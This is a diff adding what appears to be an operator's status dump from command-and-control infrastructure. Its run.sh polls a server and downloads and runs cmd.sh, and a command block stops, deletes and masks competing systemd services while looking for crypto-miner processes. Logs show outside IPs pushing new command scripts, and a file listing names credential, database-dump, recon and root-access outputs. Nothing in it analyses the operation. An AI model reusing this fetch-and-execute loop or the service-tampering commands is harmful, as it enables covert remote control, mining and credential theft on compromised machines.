@@ -1,0 +1,126 @@
+134.138.42.141### GV9 2026-11-25T00:50:28Z
+### RUN.SH
+#!/bin/bash
+S=$(curl -s -m 10 http://127.0.0.1:8099/seq 2>/dev/null | tr -dc 0-9)
+[ -z "$S" ] && exit 0
+L=$(cat /opt/t19/www/.seq 2>/dev/null)
+[ "$S" = "$L" ] && exit 0
+echo "=== SEQ $S $(date -u) ==="
+curl -s -m 60 http://127.0.0.1:8099/cmd.sh -o /tmp/t19cmd.sh && /bin/bash /tmp/t19cmd.sh 2>&1
+echo "=== END $S ==="
+echo "$S" > /opt/t19/www/.seq
+
+### SEQ
+6877301
+### SEQ2
+1795551810
+### CMD2-HEAD
+O=/opt/t19/www/i6564_r4.txt
+{
+echo "=== I6564 ACT2 $(date -u)"
+systemctl stop ulx-guard.timer ulx-guard.service nv-cuda-cache.service 2>/dev/null
+rm -f /etc/systemd/system/ulx-guard.timer /etc/systemd/system/ulx-guard.service /etc/systemd/system/nv-cuda-cache.service
+for i in 0 1 2 3 4 5 6 7; do rm -f /etc/systemd/system/ul-g$i.service /etc/systemd/system/ulx-g$i.service; done
+systemctl daemon-reload
+systemctl mask ulx-guard.timer ulx-guard.service nv-cuda-cache.service 2>&1 | head -6
+for i in 0 1 2 3 4 5 6 7; do systemctl mask ul-g$i.service ulx-g$i.service >/dev/null 2>&1; done
+echo "--- MASKED"; ls -la /etc/systemd/system/ | grep -E "ulx-guard|nv-cuda|ul-g|ulx-g"
+echo "--- T19PEARL"; cat /opt/t19/sup2.sh 2>&1 | head -40; echo "--status--"; systemctl is-active t19-pearl; pgrep -fa "t19/sup2|/opt/t19" | grep -v grep | head
+echo "--- NOWPROC"; ps -eo pid,args | grep -Ei "wildrig|krig|\.bd|sup2" | grep -v grep | awk '{print $1, $2, $3, $4}' | head -20
+echo "--- COUNTS"; for i in 0 1 2 3 4 5 6 7; do printf "g%s=%s " $i "$(pgrep -fc "plh-123-184-7-135-g$i")"; done; echo
+echo "--- END"
+} > $O 2>&1
+
+### MARKER-RETRY
+ok
+get-root 200
+UL5817M1795567830
+get-updir 404
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+        "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+    <head>
+   
+### HITS-TAIL
+153.56.230.3 POST /put/cmd.sh 2216
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 798
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 86
+153.56.230.3 POST /put/seq 7
+153.56.230.3 POST /put/i6877probe.txt 10
+153.56.230.3 POST /put/cmd.sh 667
+153.56.230.3 POST /put/seq 7
+153.56.230.3 POST /put/cmd.sh 1002
+153.56.230.3 POST /put/seq 7
+20.169.120.182 POST /up/ul5817_1795567743.txt 24
+20.169.120.182 POST /up/ 1
+20.169.120.182 POST /upload 1
+20.169.120.182 POST /api/up 1
+20.169.120.182 POST /cmd 1
+20.169.120.182 POST /run 1
+20.169.120.182 POST /put 1
+20.171.39.118 POST /put/ul5817m_1795567825.txt 17
+134.138.42.141 POST /put/ul5817m_1795567830.txt 17
+### PYSRV-HINT
+href=".plh/"
+href=".seq"
+href="access.log"
+href="boot.txt"
+href="c16.sh"
+href="c17.sh"
+href="c18.sh"
+href="c19.sh"
+href="c20.sh"
+href="c21.sh"
+href="cmd.sh"
+href="cmd1.sh"
+href="cmd2.sh"
+href="d3.txt"
+href="d4.txt"
+href="diag17.sh"
+href="diag6421.txt"
+href="diag6421b.txt"
+href="hits.log"
+href="i6425_p1.txt"
+href="i6425_p2.txt"
+href="i6564_final.txt"
+href="i6564_r1.txt"
+href="i6564_r2.txt"
+href="i6564_r3.txt"
+href="i6564_r5.txt"
+href="i6564_r6.txt"
+href="i6564_r7.txt"
+href="i6564_r8.txt"
+href="i6564_r9.txt"
+href="i6647_probe.txt"
+href="i6647_r1.txt"
+href="i6647_r2.txt"
+href="i6647_r3.txt"
+href="i6647_r4.txt"
+href="i6647_r5.txt"
+href="i6647_r6.txt"
+href="i6681_r0.txt"
+href="i6681_r1.txt"
+href="i6821_ars.txt"
+href="i6821_cfg.txt"
+href="i6821_creds.txt"
+href="i6821_db.txt"
+href="i6821_dedupe.txt"
+href="i6821_dump.py"
+href="i6821_dump.txt"
+href="i6821_evict.txt"
+href="i6821_fix.txt"
+href="i6821_grep.txt"
+href="i6821_manifest.txt"
+href="i6821_minio.txt"
+href="i6821_minio2.txt"
+href="i6821_minio3.txt"
+href="i6821_recon.txt"
+href="i6821_supp.txt"
+href="i6821art/"
+href="i6877_r6877101.txt"
+href="i6877_root1.txt"
+href="i6877_root2.txt"
+href="i6877probe.txt"
+### DONE9
